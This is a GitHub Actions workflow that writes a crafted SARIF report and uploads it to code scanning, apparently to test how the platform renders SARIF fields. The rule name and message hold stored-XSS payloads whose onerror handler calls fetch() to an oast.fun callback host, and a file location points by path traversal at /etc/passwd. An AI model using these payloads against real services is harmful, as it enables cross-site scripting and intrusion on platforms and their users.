name: G10 SARIF parser
on:
  push:
    branches: [main]
  workflow_dispatch:
permissions:
  contents: read
  security-events: write
jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: Create crafted SARIF
        shell: bash
        run: |
          cat > /tmp/g10.sarif <<'JSON'
          {
            "version": "2.1.0",
            "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
            "runs": [{
              "tool": {
                "driver": {
                  "name": "G10 Parser",
                  "version": "1",
                  "rules": [{
                    "id": "G10-XSS",
                    "name": "<img src=x onerror=fetch('https://d9ogvgsino337373fglg9w7ghoqyjss4k.oast.fun/xss-rule')>",
                    "shortDescription": {"text": "G10 parser boundary <b>sentinel</b>"}
                  }]
                }
              },
              "results": [{
                "ruleId": "G10-XSS",
                "level": "error",
                "message": {"text": "<img src=x onerror=fetch('https://d9ogvgsino337373fglg9w7ghoqyjss4k.oast.fun/xss-message')>"},
                "locations": [{
                  "physicalLocation": {
                    "artifactLocation": {"uri": "../../../../etc/passwd"},
                    "region": {"startLine": 1}
                  }
                }]
              }]
            }]
          }
          JSON
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: /tmp/g10.sarif
          category: g10-parser
